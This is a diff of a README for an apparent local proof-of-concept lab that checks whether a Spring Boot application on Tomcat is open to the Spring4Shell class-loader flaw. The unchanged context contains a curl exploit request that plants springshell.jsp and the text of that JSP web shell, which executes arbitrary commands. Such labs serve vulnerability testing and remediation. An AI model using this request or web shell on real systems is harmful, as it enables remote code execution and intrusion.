@@ -11,7 +11,7 @@ Below are 2 paths to create a service. One is a spring-boot WAR running on stand
    - Build a tomcat 8 JDK 11 image (This POC uses Amazon Corretto, but pick your applicable image)
    - Run a container from the image        
  `mvn clean package -P war && docker build . -f Dockerfile-war -t springshell && docker run --name springshell --rm -p 8080:8080 springshell`
-2. Run curl command attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp name is springshell.jsp
+2. Run below POST request that attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp file is springshell.jsp
    1. If the jsp is not created, _the application is not compromised_
 ```
 curl --request POST \
@@ -26,7 +26,7 @@ curl --request POST \
   --data class.module.classLoader.resources.context.parent.pipeline.first.prefix=springshell \
   --data class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 ```
-3. Review jsp content:
+3. If springshell.jsp file is created, review jsp content:
    `docker exec -it springshell bash -c "cd webapps/ROOT;cat springshell.jsp"` will display
    `<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %>//`
    _This means the application is compromised_. Refer remediation steps in the references below
@@ -37,7 +37,7 @@ curl --request POST \
     - Build a JDK 11 image (This POC uses Amazon Corretto, but pick your applicable image)
     - Create a container from the image        
       `mvn clean package && docker build . -t springshell && docker run --name springshell --rm -p 8080:8080 springshell`
-2. Run curl command that attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp name is springshell.jsp
+2. Run below POST request that attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp file is springshell.jsp
 ```
 curl --request POST \
   --url http://localhost:8080/zeroday \
